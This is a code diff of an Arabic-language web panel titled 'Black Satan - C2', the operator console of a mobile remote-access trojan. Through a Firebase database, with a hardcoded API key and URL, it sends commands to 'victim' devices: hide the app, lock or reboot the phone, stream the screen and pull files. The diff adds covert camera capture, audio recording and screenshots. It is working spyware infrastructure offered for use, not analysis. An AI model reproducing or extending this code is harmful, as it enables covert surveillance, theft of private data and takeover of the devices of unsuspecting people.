@@ -3,72 +3,56 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>💀 بلاك الشيطان</title>
+    <title>💀 بلاك الشيطان - C2</title>
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
     <style>
-        /* ========== التصميم العام ========== */
         *{margin:0;padding:0;box-sizing:border-box;font-family:sans-serif}
-        body{background:#0a0000;color:#fff;padding-bottom:75px;min-height:100vh;overflow-x:hidden}
-        /* ========== شاشة التحميل ========== */
+        body{background:#0a0000;color:#fff;padding-bottom:75px;min-height:100vh}
         #splash{position:fixed;top:0;left:0;width:100%;height:100%;background:#0a0000;display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:9999;transition:opacity 0.8s}
         #splash.hide{opacity:0;pointer-events:none}
-        .skull{font-size:80px;display:block;animation:pulse 1.5s infinite;text-shadow:0 0 40px #ff0000,0 0 80px #ff0000}
-        @keyframes pulse{0%,100%{transform:scale(1);text-shadow:0 0 40px #ff0000}50%{transform:scale(1.1);text-shadow:0 0 80px #ff0000,0 0 120px #ff0000}}
-        .ring{width:120px;height:120px;border:4px solid transparent;border-top:4px solid #ff0000;border-radius:50%;margin:20px auto;animation:spin 1s linear infinite;box-shadow:0 0 30px rgba(255,0,0,0.3)}
+        .skull{font-size:80px;animation:pulse 1.5s infinite;text-shadow:0 0 40px #ff0000}
+        @keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.1)}}
+        .ring{width:120px;height:120px;border:4px solid transparent;border-top:4px solid #ff0000;border-radius:50%;margin:20px auto;animation:spin 1s linear infinite}
         @keyframes spin{to{transform:rotate(360deg)}}
-        .progress{width:200px;height:4px;background:#1a0000;border-radius:4px;margin:20px auto;overflow:hidden;box-shadow:0 0 20px rgba(255,0,0,0.2)}
-        .progress-bar{height:100%;width:0%;background:linear-gradient(90deg,#ff0000,#ff6600);border-radius:4px;transition:width 0.1s}
-        .percent{color:#ff0000;font-size:14px;font-family:monospace;letter-spacing:2px;text-shadow:0 0 10px #ff0000}
-        .splash-text{color:#ff0000;font-size:28px;font-weight:bold;letter-spacing:4px;margin-top:20px;text-shadow:0 0 30px #ff0000;min-height:40px;opacity:0;transition:opacity 0.5s}
+        .progress{width:200px;height:4px;background:#1a0000;border-radius:4px;margin:20px auto;overflow:hidden}
+        .progress-bar{height:100%;width:0%;background:linear-gradient(90deg,#ff0000,#ff6600);transition:width 0.1s}
+        .percent{color:#ff0000;font-family:monospace}
+        .splash-text{color:#ff0000;font-size:28px;font-weight:bold;letter-spacing:4px;margin-top:20px;min-height:40px;opacity:0;transition:opacity 0.5s}
         .splash-text.show{opacity:1}
         .sub{color:#660000;font-size:12px;letter-spacing:2px;margin-top:10px;font-family:monospace}
-        .glitch{position:fixed;top:0;left:0;width:100%;height:2px;background:linear-gradient(90deg,transparent,#ff0000,transparent);animation:glitch 2s infinite;opacity:0.5}
-        @keyframes glitch{0%{transform:translateX(-100%)}100%{transform:translateX(100%)}}
-        /* ========== التطبيق الرئيسي ========== */
         #app{display:none;animation:fadeIn 0.5s}
         #app.show{display:block}
-        @keyframes fadeIn{from{opacity:0;transform:scale(0.95)}to{opacity:1;transform:scale(1)}}
+        @keyframes fadeIn{from{opacity:0}to{opacity:1}}
         .header{background:linear-gradient(135deg,#0a0000,#1a0000);padding:15px;text-align:center;border-bottom:2px solid #ff0000;position:sticky;top:0;z-index:100}
         .header h1{color:#ff0000;font-size:22px;text-shadow:0 0 30px #ff0000;letter-spacing:4px}
-        .header .sub{color:#660000;font-size:11px;letter-spacing:2px}
-        .page{display:none;padding:15px;animation:fadeIn 0.3s}
+        .page{display:none;padding:15px}
         .page.active{display:block}
-        /* ========== شريط التنقل السفلي ========== */
         .bottom-nav{position:fixed;bottom:0;left:0;width:100%;background:#1a0000;display:flex;justify-content:space-around;padding:8px 0;border-top:2px solid #330000;z-index:999}
-        .nav-item{text-align:center;color:#660000;font-size:10px;cursor:pointer;transition:0.3s;padding:5px 10px}
+        .nav-item{text-align:center;color:#660000;font-size:10px;cursor:pointer;padding:5px 10px}
         .nav-item.active{color:#ff0000;text-shadow:0 0 20px #ff0000}
-        .nav-item .icon{font-size:22px;display:block;margin-bottom:2px}
-        /* ========== الأزرار والأوامر ========== */
+        .nav-item .icon{font-size:22px;display:block}
         .cmd-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:10px}
-        .cmd-btn{padding:12px;background:#1a0000;border:1px solid #330000;border-radius:12px;text-align:center;cursor:pointer;transition:0.3s}
+        .cmd-btn{padding:12px;background:#1a0000;border:1px solid #330000;border-radius:12px;text-align:center;cursor:pointer}
         .cmd-btn:hover{border-color:#ff0000;box-shadow:0 0 30px rgba(255,0,0,0.2)}
-        .cmd-btn .icon{font-size:26px;display:block;margin-bottom:4px}
+        .cmd-btn .icon{font-size:26px;display:block}
         .cmd-btn .label{font-size:10px;color:#aaa}
         .btn-danger{background:#ff0000;color:#000;border:none;padding:12px;border-radius:10px;font-size:16px;font-weight:bold;cursor:pointer;width:100%;margin-top:10px}
-        .btn-danger:hover{box-shadow:0 0 40px rgba(255,0,0,0.3)}
         .btn-secondary{background:#330000;color:#fff;border:none;padding:12px;border-radius:10px;font-size:16px;cursor:pointer;width:100%;margin-top:10px}
-        /* ========== الأجهزة والملفات ========== */
-        .device-item{background:#0a0000;border:1px solid #330000;border-radius:10px;padding:12px;margin-bottom:8px;cursor:pointer;transition:0.3s}
+        .device-item{background:#0a0000;border:1px solid #330000;border-radius:10px;padding:12px;margin-bottom:8px;cursor:pointer}
         .device-item:hover{border-color:#ff0000}
         .device-item .name{color:#fff;font-size:14px}
         .device-item .version{color:#666;font-size:11px}
         .file-item{background:#0a0000;border:1px solid #330000;border-radius:8px;padding:10px;margin-bottom:6px;display:flex;justify-content:space-between;align-items:center}
         .file-item .name{color:#00ff00;font-size:13px}
-        .file-item .size{color:#666;font-size:11px}
         .input-field{width:100%;padding:12px;margin-bottom:10px;border-radius:10px;border:1px solid #330000;background:#0a0000;color:#fff;font-size:14px}
         .input-field:focus{border-color:#ff0000;outline:none}
-        /* ========== بث الشاشة ========== */
         .stream-container{background:#0a0000;border:2px solid #330000;border-radius:15px;padding:15px;min-height:300px;display:flex;align-items:center;justify-content:center;color:#666;flex-direction:column}
         .stream-container.active{background:#001a00;border-color:#00ff00}
-        .stream-container img{max-width:100%;border-radius:8px;margin-top:10px}
     </style>
 </head>
 <body>
-
-    <!-- ====== شاشة التحميل ====== -->
     <div id="splash">
-        <div class="glitch"></div>
         <span class="skull">💀</span>
         <div class="ring"></div>
         <div class="progress"><div class="progress-bar" id="progressBar"></div></div>
@@ -77,14 +61,9 @@
         <div class="sub">/// بلاك الشيطان ///</div>
     </div>
 
-    <!-- ====== التطبيق الرئيسي ====== -->
     <div id="app">
-        <div class="header">
-            <h1>💀 بلاك الشيطان</h1>
-            <div class="sub">/// اختراق النظام ///</div>
-        </div>
+        <div class="header"><h1>💀 بلاك الشيطان</h1></div>
 
-        <!-- الصفحات -->
         <div id="page-home" class="page active">
             <h3 style="color:#ff0000;margin-bottom:10px;">📱 الأجهزة المتصلة</h3>
             <div id="deviceList"></div>
@@ -121,17 +100,23 @@
                 <div class="cmd-btn" onclick="execCmd('show_app')"><span class="icon">👁</span><span class="label">إظهار التطبيق</span></div>
                 <div class="cmd-btn" onclick="execCmd('fake_notif')"><span class="icon">🔔</span><span class="label">إشعار وهمي</span></div>
                 <div class="cmd-btn" onclick="execCmd('lock_device')"><span class="icon">🔒</span><span class="label">قفل الجهاز</span></div>
+                <div class="cmd-btn" onclick="execCmd('take_photo')"><span class="icon">📸</span><span class="label">تصوير خلفي</span></div>
+                <div class="cmd-btn" onclick="execCmd('take_photo_front')"><span class="icon">🤳</span><span class="label">تصوير أمامي</span></div>
+                <div class="cmd-btn" onclick="execCmd('flash_on')"><span class="icon">🔦</span><span class="label">فلاش تشغيل</span></div>
+                <div class="cmd-btn" onclick="execCmd('flash_off')"><span class="icon">🔦</span><span class="label">فلاش إيقاف</span></div>
+                <div class="cmd-btn" onclick="execCmd('start_record')"><span class="icon">🎙</span><span class="label">تسجيل صوت</span></div>
+                <div class="cmd-btn" onclick="execCmd('stop_record')"><span class="icon">⏹</span><span class="label">إيقاف التسجيل</span></div>
+                <div class="cmd-btn" onclick="execCmd('screenshot')"><span class="icon">📷</span><span class="label">لقطة شاشة</span></div>
+                <div class="cmd-btn" onclick="execCmd('reboot')"><span class="icon">🔄</span><span class="label">إعادة تشغيل</span></div>
+                <div class="cmd-btn" onclick="execCmd('shutdown')"><span class="icon">⏻</span><span class="label">إيقاف تشغيل</span></div>
             </div>
         </div>
 
         <div id="page-stream" class="page">
             <h3 style="color:#ff0000;margin-bottom:10px;">📡 بث الشاشة</h3>
-            <div class="stream-container" id="streamContainer">
-                <span style="color:#660000;">⏳ انتظر بدء البث...</span>
-            </div>
+            <div class="stream-container" id="streamContainer"><span style="color:#660000;">⏳ انتظر بدء البث...</span></div>
             <button class="btn-danger" onclick="startStream()">▶️ بدء البث</button>
             <button class="btn-secondary" onclick="stopStream()">⏹ إيقاف البث</button>
-            <div style="margin-top:10px;color:#666;font-size:11px;text-align:center;">⚠️ سيطلب من الضحية الموافقة مرة واحدة</div>
         </div>
 
         <div id="page-files" class="page">
@@ -145,10 +130,8 @@
             <input class="input-field" id="databaseURL" placeholder="رابط قاعدة البيانات" value="https://black-cock-4929d-default-rtdb.firebaseio.com/">
             <button class="btn-danger" onclick="saveSettings()">💾 حفظ الإعدادات</button>
             <button class="btn-secondary" onclick="toggleHide()">👁️ إخفاء/إظهار التطبيق (الضحية)</button>
-            <div style="margin-top:10px;color:#666;font-size:11px;text-align:center;">🔑 يمكنك إخفاء تطبيق الضحية عن بُعد</div>
         </div>
 
-        <!-- شريط التنقل السفلي -->
         <div class="bottom-nav">
             <div class="nav-item active" onclick="showPage('page-home', this)"><span class="icon">🏠</span>الرئيسية</div>
             <div class="nav-item" onclick="showPage('page-commands', this)"><span class="icon">⚡</span>الأوامر</div>
@@ -159,9 +142,7 @@
     </div>
 
     <script>
-        // ======================================================================
-        // ========== شاشة التحميل ==========
-        // ======================================================================
+        // شاشة التحميل
         let progress = 0;
         const text = "تم الفتح";
         const letters = text.split('');
@@ -177,7 +158,6 @@
             if (progress > 100) progress = 100;
             bar.style.width = progress + '%';
             percent.textContent = progress + '%';
-
             if (progress >= 10 && index < letters.length) {
                 splashText.textContent += letters[index];
                 index++;
@@ -190,23 +170,16 @@
                     }, 1500);
                 }
             }
-
-            if (progress >= 100) {
-                clearInterval(interval);
-            }
+            if (progress >= 100) clearInterval(interval);
         }, 150);
 
-        // ======================================================================
-        // ========== تطبيق التحكم ==========
-        // ======================================================================
-
+        // Firebase
         let selectedDevice = null;
         let devices = {};
         let database = null;
         let commandsRef = null;
         let dataListener = null;
 
-        // تحميل الإعدادات
         document.getElementById('apiKey').value = localStorage.getItem('fb_apiKey') || 'AIzaSyDBizqAKWSwGsicO6eRua-5x_8VQLFKTIc';
         document.getElementById('databaseURL').value = localStorage.getItem('fb_databaseURL') || 'https://black-cock-4929d-default-rtdb.firebaseio.com/';
 
@@ -229,7 +202,6 @@
                 firebase.initializeApp(config);
                 database = firebase.database();
                 commandsRef = database.ref('commands');
-                // مراقبة الأجهزة
                 database.ref('devices').on('value', snapshot => {
                     const data = snapshot.val();
                     devices = {};
@@ -243,12 +215,9 @@
                     }
                     updateDevices();
                 });
-                // مراقبة الملفات
                 database.ref('devices').on('value', snapshot => {
                     const data = snapshot.val();
-                    if (data) {
-                        updateFiles(data);
-                    }
+                    if (data) updateFiles(data);
                 });
                 alert('✅ تم الاتصال بـ Firebase');
             } catch(e) { alert('❌ خطأ: ' + e.message); }
@@ -275,9 +244,7 @@
                     }
                     dataListener = database.ref('devices').child(id).child('data').on('value', snapshot => {
                         const data = snapshot.val();
-                        if (data) {
-                            showFile(data);
-                        }
+                        if (data) showFile(data);
                     });
                 };
                 container.appendChild(div);
@@ -295,10 +262,7 @@
                     const fileData = dev.data.FILE;
                     try {
                         const json = JSON.parse(fileData);
-                        html += `<div class="file-item">
-                            <span class="name">📄 ${json.name}</span>
-                            <span class="size">${json.caption || ''}</span>
-                        </div>`;
+                        html += `<div class="file-item"><span class="name">📄 ${json.name}</span><span class="size">${json.caption || ''}</span></div>`;
                     } catch(e) {}
                 }
             }
@@ -310,10 +274,7 @@
             try {
                 const json = JSON.parse(data);
                 if (json.name && json.url) {
-                    container.innerHTML = `<div class="file-item">
-                        <span class="name">✅ ${json.name}</span>
-                        <a href="${json.url}" target="_blank" style="color:#00ff00;">📥 تحميل</a>
-                    </div>`;
+                    container.innerHTML = `<div class="file-item"><span class="name">✅ ${json.name}</span><a href="${json.url}" target="_blank" style="color:#00ff00;">📥 تحميل</a></div>`;
                 }
             } catch(e) {}
         }
@@ -331,9 +292,6 @@
             container.innerHTML = '<span style="color:#00ff00;">🟢 جاري طلب الموافقة على البث...</span>';
             container.classList.add('active');
             commandsRef.child(selectedDevice).set('start_stream');
-            setTimeout(() => {
-                container.innerHTML = '<span style="color:#00ff00;">🟢 جاري البث...</span>';
-            }, 5000);
         }
 
         function stopStream() {
@@ -346,7 +304,7 @@
 
         function toggleHide() {
             if (!selectedDevice) return alert('⚠️ اختر جهازاً أولاً');
-            const action = confirm('هل تريد إخفاء التطبيق على جهاز الضحية؟') ? 'hide_app' : 'show_app';
+            const action = confirm('إخفاء التطبيق؟') ? 'hide_app' : 'show_app';
             commandsRef.child(selectedDevice).set(action);
             alert('✅ تم إرسال الأمر: ' + action);
         }
